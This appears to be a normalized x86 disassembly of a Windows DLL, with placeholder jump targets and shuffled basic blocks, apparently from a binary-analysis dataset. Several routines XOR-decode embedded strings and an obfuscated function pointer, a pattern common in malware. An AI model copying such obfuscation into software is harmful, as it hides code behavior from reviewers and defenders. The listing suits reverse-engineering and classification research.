mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003c746
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1006a233
push 0x4
mov eax sub_10085139
call sub_100624bc
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_10013ab8
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_10034e98
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10069747
push 0x20
call sub_1001f84c
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_100539a0
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_1004ed30
mov ecx esi
mov [ rw-data ] esi
call sub_10029420
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_10021113
mov esi eax
sub_1006a2d0
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
mov edi edx
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0xc0 ] edi
mov [ ebp - 0xb8 ] ebx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9f
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0x24 ]
xor eax eax
push edx
mov [ ebp - 0x12 ] ax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x12e
mov [ ebp - 0xbc ] ebx
call sub_10053240
lea eax [ ebp - 0xbc ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xef
call sub_10053240
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x111
call sub_10053240
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x116
call sub_10053240
mov edi eax
call sub_1006fd00
mov edi [ ebp - 0xc0 ]
jmp r-xdata
mov ebx [ ebp - 0xb8 ]
mov [ edi ] eax
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x27
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edi [ edi ]
call sub_1006b3f0
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0xbc ]
test ebx ebx
je r-xdata
sub_1006a460
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_10024fe9
lea eax [ ecx + ecx ]
push eax
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_1006a4c0
push esi
push 0x0
push 0x82
push 0x4
push 0x0
push 0x1
push 0x40000000
push eax
mov esi ecx
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
pop esi
retn
push 0x2
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
push 0x0
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
add eax eax
push eax
call sub_10009140
add esp 0x4
mov [ rw-data ] 0x1
sub_1006a530
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_100699f0
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
pop edi
sub_1006a570
cmp [ edx + 0xd6 ] 0x0
je r-xdata
mov eax [ edx + 0xd8 ]
mov eax [ edx + 0xdc ]
jmp r-xdata
mov eax 0x1f4
retn
sub eax ecx
retn
mov ecx [ edx + 0x108 ]
add ecx [ edx + 0x100 ]
mov edx [ edx + 0x50 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + edx + 0x4f ]
cmp eax ecx
jbe r-xdata
sub_1006a5b0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x830 ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x828 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ ebp - 0x834 ]
lea eax [ ebp - 0x82c ]
mov [ ebp - 0x82c ] eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x830 ]
push eax
lea ebx [ ebp - 0x620 ]
mov esi ecx
call sub_1006fd40
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
lea ebx [ ebp - 0x418 ]
call sub_10030e90
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x82c ]
mov esi [ edi + 0xc ]
test eax eax
jne r-xdata
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi + 0x18 ]
push edi
push eax
mov [ ebp - 0x834 ] dl
mov eax [ ebp - 0x834 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
lea edx [ ebp - 0x418 ]
push edx
mov edx [ ebp - 0x830 ]
lea eax [ ebp - 0x828 ]
push eax
lea ecx [ ebp - 0x620 ]
xor ebx ebx
xor esi esi
call sub_1006d0d0
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov ecx [ eax + 0xf4 ]
push ecx
mov [ eax + 0xe8 ] ebx
mov [ eax + 0xf0 ] ebx
mov [ eax + 0xec ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
sub_1006a720
push ebp
mov ebp esp
push 0xffffffff
push sub_10086898
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x8
push 0x0
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x30 ] eax
call sub_10062d50
mov ecx edi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi [ eax + 0x10 ]
mov ebx ecx
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
push ecx
push edi
push eax
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
mov eax [ eax ]
sete bl
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp esi ebx
jae r-xdata
mov edx [ ebp - 0x30 ]
xor ecx ecx
test bl bl
setne cl
mov [ edx ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
jmp r-xdata
test eax eax
sub_1006a7e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10013acc
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1006a820
push ebp
mov ebp esp
push 0xffffffff
push sub_100850f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x64 ] 0x0
call sub_1005f050
push edi
push esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10038510
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x0
call sub_10035ec0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1006a8b0
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] 0x8
mov [ ebp - 0x4 ] edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x18
sub_1006a930
push ebp
mov ebp esp
push 0xffffffff
push sub_10089546
mov eax [ fs : 0x0 ]
push eax
sub esp 0x27c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0x4 ]
mov esi [ ebp + 0x8 ]
movzx ecx cx
mov [ ebp - 0x270 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x274 ] ecx
mov cl [ ebp + 0x14 ]
mov [ ebp - 0x27c ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x265 ] cl
mov [ ebp - 0x288 ] edx
mov [ ebp - 0x26c ] ebx
cmp edi [ ebx + 0x8 ]
je r-xdata
xor eax eax
mov edi edi
push esi
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov eax [ ebp - 0x270 ]
mov edx [ edi ]
lea esi [ eax + 0x2 ]
xor ebx ebx
mov edi edi
add edi 0x4
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
mov eax [ ebp - 0x270 ]
push eax
lea ecx [ edx + 0x4 ]
call sub_1005ddc0
mov eax [ edi ]
mov cx [ ebp - 0x274 ]
mov esi [ ebp - 0x27c ]
mov [ eax + 0x3c ] cx
xor edx edx
mov eax esi
mov [ ebp - 0x90 ] 0x7
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0xa4 ] dx
lea ecx [ eax + 0x2 ]
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xa4 ]
call sub_1005ddc0
mov edx [ ebp - 0x278 ]
lea eax [ ebp - 0xa4 ]
push eax
lea esi [ ebp - 0x14c ]
mov [ ebp - 0x4 ] ebx
call sub_1001ccb0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax [ ebp - 0x280 ]
lea ecx [ esi + 0x40 ]
sar eax 0x1
push eax
push edx
call sub_1005ddc0
mov esi 0x8
cmp [ ebp - 0xc8 ] esi
jb r-xdata
mov esi [ edi ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x280 ] ecx
nop
xor eax eax
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xdc ] ax
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x138 ] 0x7
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x14c ] dx
cmp [ ebp - 0x90 ] esi
jb r-xdata
mov ecx [ ebp - 0x14c ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ edi ]
mov cl [ ebp - 0x265 ]
mov edx [ ebp + 0x1c ]
mov [ eax + 0x3e ] cl
mov eax [ edi ]
mov [ eax + 0xcc ] edx
mov edx [ ebp - 0x288 ]
cmp edx ebx
je r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x26c ]
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx eax
sub edx ecx
push sub_10062b50
sar edx 0x2
push edx
push eax
push ecx
call sub_1001f500
mov ecx [ r--data ]
add esp 0x10
xor eax eax
jmp r-xdata
mov edi [ edi ]
mov eax edx
lea esi [ eax + 0x2 ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x11
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x20 ]
call sub_1005ddc0
mov edx [ ebp - 0x278 ]
xor eax eax
mov [ ebp - 0x12 ] ax
mov esi 0x7
xor ecx ecx
mov eax edx
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] cx
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xc0 ]
call sub_1005ddc0
mov edi [ ebp - 0x27c ]
mov [ ebp - 0x4 ] 0x3
xor edx edx
mov eax edi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] dx
lea ecx [ eax + 0x2 ]
nop
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x6c ]
call sub_1005ddc0
movzx eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x1d8 ]
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_1005f2b0
add esp 0x8
mov [ ebp - 0x26c ] eax
mov edi [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x5
xor edx edx
mov eax edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] dx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x50 ]
call sub_1005ddc0
mov edx [ ebp - 0x284 ]
mov [ ebp - 0x4 ] 0x6
xor eax eax
mov [ ebp - 0x88 ] ax
mov eax edx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] ebx
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x88 ]
call sub_1005ddc0
movzx ecx [ ebp - 0x265 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x4 ] 0x7
call sub_1005f2b0
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x264 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005bbc0
add esp 0xc
push eax
mov edx r--data
lea esi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x9
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x88 ]
lea edi [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0xa
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0xb
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x50 ]
lea edi [ ebp - 0x184 ]
mov [ ebp - 0x4 ] 0xc
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0xd
call sub_1001ccb0
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x26c ]
lea edi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xe
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x210 ]
mov [ ebp - 0x4 ] 0xf
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x6c ]
lea edi [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x10
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0x11
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0xc0 ]
lea edi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x12
call sub_10057920
mov edx eax
mov ecx 0xca
mov [ ebp - 0x4 ] 0x13
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x234 ] esi
jb r-xdata
xor ecx ecx
mov edi 0x7
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x248 ] cx
cmp [ ebp - 0x18c ] esi
jb r-xdata
mov eax [ ebp - 0x248 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x1a0 ] ax
cmp [ ebp - 0xe4 ] esi
jb r-xdata
mov edx [ ebp - 0x1a0 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0xe4 ] edi
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf8 ] dx
cmp [ ebp - 0x1fc ] esi
jb r-xdata
mov ecx [ ebp - 0xf8 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1fc ] edi
mov [ ebp - 0x200 ] ebx
mov [ ebp - 0x210 ] cx
cmp [ ebp - 0x100 ] esi
jb r-xdata
mov eax [ ebp - 0x210 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x100 ] edi
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0x114 ] ax
cmp [ ebp - 0x11c ] esi
jb r-xdata
mov edx [ ebp - 0x114 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] dx
cmp [ ebp - 0x170 ] esi
jb r-xdata
mov ecx [ ebp - 0x130 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x170 ] edi
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x184 ] cx
cmp [ ebp - 0x1a8 ] esi
jb r-xdata
mov eax [ ebp - 0x184 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x1bc ] ax
cmp [ ebp - 0x1e0 ] esi
jb r-xdata
mov edx [ ebp - 0x1bc ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x1e0 ] edi
mov [ ebp - 0x1e4 ] ebx
mov [ ebp - 0x1f4 ] dx
cmp [ ebp - 0x218 ] esi
jb r-xdata
mov ecx [ ebp - 0x1f4 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x22c ] cx
cmp [ ebp - 0x250 ] esi
jb r-xdata
mov eax [ ebp - 0x22c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x250 ] edi
mov [ ebp - 0x254 ] ebx
mov [ ebp - 0x264 ] ax
cmp [ ebp - 0x154 ] esi
jb r-xdata
mov edx [ ebp - 0x264 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x154 ] edi
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x168 ] dx
cmp [ ebp - 0x74 ] esi
jb r-xdata
mov ecx [ ebp - 0x168 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] ax
cmp [ ebp - 0x1c4 ] esi
jb r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1c8 ] ebx
mov [ ebp - 0x1d8 ] dx
cmp [ ebp - 0x58 ] esi
jb r-xdata
mov ecx [ ebp - 0x1d8 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] cx
cmp [ ebp - 0xac ] esi
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
sub_1006b0f0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi [ ecx + 0x24 ]
push edi
mov edi eax
add edi [ ebp + 0xc ]
mov eax [ esi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp edi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov edi edx
mov esi [ esi ]
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea eax [ esi + esi ]
add [ ecx ] eax
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_1006b226
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_1001da0a
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
push [ edi + esi * 4 + 0x1c ]
call sub_1007fa90
push [ edi + esi * 4 ]
mov [ ebp - 0x8 ] eax
call sub_1007fa90
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002fb6b
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
push esi
call sub_1007fa90
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1007fa90
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_1006b310
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
